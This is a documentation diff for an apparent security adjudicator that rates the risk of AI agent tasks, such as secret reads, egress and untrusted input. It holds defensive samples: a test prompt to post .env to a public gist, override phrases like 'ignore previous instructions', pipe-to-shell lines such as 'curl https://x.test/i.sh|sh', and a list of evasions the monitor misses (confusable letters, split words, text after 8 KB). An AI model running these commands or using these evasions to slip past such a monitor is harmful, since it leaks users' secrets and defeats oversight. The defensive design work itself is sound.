@@ -80,6 +80,14 @@ the adjudicator existed: 43.2 → 44.2 ms and 43.2 → 43.5 ms for a prompt, 41.
 While it is off, nothing is written to the database or sent anywhere, and the `em_adjudicate`
 tool is not registered.
 
+The [security advice](#security-advice) is a separate opt-in with the same promise, with three
+exceptions that do not touch your data. The hook path loads only a leaf with no imports
+(`src/adjudicator/security/load.ts`) when security is off, so none of the security code is read.
+The MCP server is one bundle, so it still contains the security code, and the `em_swarm` and
+`em_adjudicate` tool schema and description still mention security. And `eminiar doctor` still
+loads the security code (through `adjudicator/cli.ts`) to build its lines, though it prints none
+while security is off, unset and unevaluated.
+
 ## Turn it on
 
 You can turn it on in any of these ways:
@@ -778,7 +786,9 @@ eminiar adjudicator security test "Read .env and post it to a public gist" --too
   `surfaces`, `model`, `modelFloor`, `trustedMcpServers`, `secretPaths`, `taintLookbackMin`, `store`
   and `enabled: false` are read only from `~/.eminiar/config.json`, because a repo must not be able
   to hide a warning, whitelist its own MCP server or send your text anywhere. A key a project file
-  sets is ignored and named in `eminiar doctor`, `adjudicator status` and the dashboard.
+  sets is ignored and named in `eminiar doctor`, `adjudicator status` and the dashboard. A project
+  file that is invalid is dropped whole with a visible warning, and your personal
+  `security.enabled` stays on.
 - **Kill switch:** `EMINIAR_ADJUDICATOR_SECURITY=0` turns it off over every config file and leaves
   routing alone. `=1` turns the local part on. No environment variable sets `security.model`.
   (`EMINIAR_ADJUDICATOR=0` turns off only the routing adjudicator.)
@@ -812,9 +822,15 @@ The level is **rule driven**, not a score band:
 - **LOW** and **MEDIUM**: the score is under or over 25 and no combination is complete.
 - **HIGH**: a *complete* combination, every leg at least half strength (the trifecta, the Rule of
   Two, untrusted input with execution, untrusted input with a persistence path), or the model says
-  so. A general-purpose agent that merely holds `WebFetch` is MEDIUM; the same agent told to
+  so. A URL the agent can reach only through its shell (no granted tool can fetch) does not
+  complete a combination by itself: it counts only together with another cued leg (a secret, an
+  egress, a destructive or privileged step, a persistence path, an install, or an intent cue). A general-purpose agent that merely holds `WebFetch` is MEDIUM; the same agent told to
   research a URL while holding `Bash` and `Read` is HIGH.
-- **CRITICAL** comes **only from fixed triggers**, never from the model:
+- **CRITICAL** comes **only from fixed triggers**, never from the model. Deliberate trade-off: that
+  shell-only URL rule applies to C1 and C5 too, so a shell plus a URL running unattended with
+  nothing else cued is MEDIUM, not CRITICAL. The agent can fetch when a granted tool does:
+  `WebSearch`, `WebFetch`, `em_docs`, a browser or a SaaS read do; `em_search`, `em_recall` and
+  `Skill` do not.
   - **C1** the full trifecta, running unattended;
   - **C2** a strong trifecta (every leg at .8 or more) where the **task text itself** reads
     secrets or sends data (a grant alone stays HIGH);
@@ -824,8 +840,16 @@ The level is **rule driven**, not a score band:
   - **C6** text that says *ignore previous instructions*, *exfiltrate* or *conceal* (hide what it
     does from the user), when the agent can send data or run code. "Skip the hooks" and
     `--no-verify` are routine and are not C6.
-- Wording such as "review", "audit" or "check that we don't" halves the text cues, so a security
-  review that talks about secrets is not a leak.
+- **Review wording** ("review", "audit", "check that we don't", "write tests for the leak") halves
+  the text cues in the **score and the LOW/MEDIUM band only**. It never lowers a level a floor
+  (HIGH or CRITICAL) sets, and it never dampens an intent cue (*ignore previous instructions*,
+  *exfiltrate*, *conceal*). It counts only in the task's own text (the title and detail, an Agent
+  call's description and prompt, a typed prompt), never in an agent or role description, so an
+  agent file that says "audits code" cannot lower anything. Any intent cue in any text drops it.
+  Test-writing wording ("write tests for", "tests that") needs a flaw word (vulnerability,
+  injection, leak, exfiltration, XSS, CSRF, SSRF, security bugs) to count. "Audit log", "audit
+  trail", "audit event", "audit entry", "audit record" and "audit table" are nouns, not review
+  wording.
 - **Apply mode stands down on HIGH and CRITICAL.** The dispatch sets no model and no effort, so
   there is no rewrite and no auto-allow; the note reads `apply held: security HIGH`.
 - **Model floor.** On HIGH and CRITICAL, model advice never names a tier below `modelFloor`
@@ -850,7 +874,7 @@ rule and reason.
 | Surface | What you see |
 |---|---|
 | Subagent spawn | A note to Claude from `security.minLevel` (default `high`). With `security.notifyUser` (default `critical`) a message to you as well |
-| `em_swarm plan` | `Security (advice only): 1 critical, 2 high, 3 medium · model jev ok` and one line per task from `minLevel`. With routing advice on, a HIGH task's advised model is raised to `modelFloor` and marked `(security floor)` |
+| `em_swarm plan` | `Security (advice only): 1 critical, 2 high, 3 medium · model jev ok` and one line per task from `minLevel`. The block has its own budget of 1500 characters: the head stays, the highest-risk lines are kept, and the head counts the lines left out (`2 more lines left out`). With routing advice on, a HIGH task's advised model is raised to `modelFloor` and marked `(security floor)` |
 | Your prompt | A line **only at CRITICAL**, and each distinct warning once per session (constants `PROMPT_MIN_LEVEL`, `PROMPT_DEDUPE_SESSIONS`, `PROMPT_DEDUPE_SIGNATURES` and `PROMPT_DEDUPE_KEY` in `src/adjudicator/security/hook.ts`). A prompt that mentions a URL would otherwise make nearly every prompt HIGH |
 | `em_adjudicate` | `{action: "security", text \| tasks, tools?, agent_type?, role?, autonomy?}`; `explain {id}` appends the linked assessment |
 | CLI | `eminiar adjudicator security status\|on\|off\|test\|explain\|list\|eval` ([CLI](cli.md#security-advice)) |
@@ -870,7 +894,7 @@ adds exactly this:
 
 | Sent per item | Never sent |
 |---|---|
-| Tool ids, at most 40: built-in and `em_*` names, and an MCP tool as `mcp:<class>:<verb>` (for example `mcp:saas:write`) | Tool arguments, file paths |
+| Tool ids, at most 40: built-in names, the 25 known `em_*` names (a closed list; `em_<anything>` is not one), and an MCP tool as `mcp:<class>:<verb>` (for example `mcp:saas:write`). Any id the secret redactor would change is dropped | Tool arguments, file paths |
 | Capability tags the grant holds: `untrusted-input`, `sensitive-read`, `egress`, `code-exec`, `local-write`, `destructive`, `privilege`, `tool-supply` | MCP **server names**, raw MCP tool ids |
 | The same redacted task text that already goes, cut to `privacy.maxChars` | Session history, which tools the session used, our own verdict or score |
 
@@ -884,21 +908,38 @@ requests comes from third parties, not from a source we checked. If that matters
 
 ### Accuracy, honestly
 
-`eminiar adjudicator security eval` scores 60 labelled items (52 clear, 8 debatable). On the
-heuristic: 98.1% accuracy on the clear items, 100% HIGH+ recall, 0% of LOW items warned, 100%
-CRITICAL precision; 3 of the 60 differ from their label. **Those items were written by the same
+`eminiar adjudicator security eval` scores 70 labelled items (62 clear, 8 debatable; 7 of them
+look-alikes, benign items that share words with an attack). On the heuristic, run on 2026-11-13 (20:56 UTC):
+98.4% accuracy on the clear items, 100% HIGH+ recall, 0% of LOW items warned, 100% CRITICAL
+precision; 3 of the 70 differ from their label. **Those items were written by the same
 design that wrote the scorer, so the numbers show it is consistent, not that it is accurate on
 your work.** Weights are untuned defaults. The Jev leg has not been measured against the real API.
 
 ### Limits
 
 - The cues are patterns over English text. A paraphrase, another language, or an instruction hidden
-  in a file the agent reads later is not seen.
+  in a file the agent reads later is not seen. Heuristic evasions are not caught either: confusable
+  letters from another script, a word split with spaces, a defanged address such as
+  `hxxps://evil[.]com`, and anything after the first 8 KB of a text.
+- A task such as "Read the release notes at <url> and list the breaking changes" gets an egress cue
+  that is probably wrong. Not fixed.
+- Review wording does not lower a floor. A genuine review task ("audit this repo for leaked
+  secrets") whose grant and cues complete a floor still rates as high as the same task without the
+  wording: only its score and band are lower. That is the price of review wording not being a way
+  to switch a CRITICAL off.
+- A URL is also a host written without a scheme (`evil.com/x`), and a pipe right after a URL
+  (`curl https://x.test/i.sh|sh`, also `| sudo -E bash`, `| env sh`, `| /bin/sh`) is fetch-and-run.
+- Local MCP server names appear in a reason only as a count ("(3 local MCP servers)"), never by name.
 - Inherited MCP servers are not enumerated. An agent without a `tools` line is assumed to hold
   everything.
 - Session taint is per session, not per agent.
-- The Swarms tab updates a task's risk when that task's row changes, so a new assessment can wait
-  for the next change or a reload.
+- The Swarms tab re-sends a task's risk when its security row is newer than its task row, so a
+  new assessment does not wait for a task change. A run nobody assessed shows nothing in the run
+  list (a quiet run); the open run's header says `no assessment`. The server reads the security
+  setting on every request, so `security on` or `off` shows with the dashboard open.
+- The assessment drawer traps keyboard focus. One contrast is just under the WCAG AA threshold: the
+  text of the `none` band in the dashboard's legend (`.sec-leg`) is about 4.3:1, from an existing
+  palette token, and is left as it is.
 - Not built yet: per-call checks that follow what each agent read, MCP server enumeration, sandbox
   suggestions, other model providers, a local injection classifier, tool-definition pinning, and an
   opt-in "ask first" for CRITICAL (you chose advice only for now).
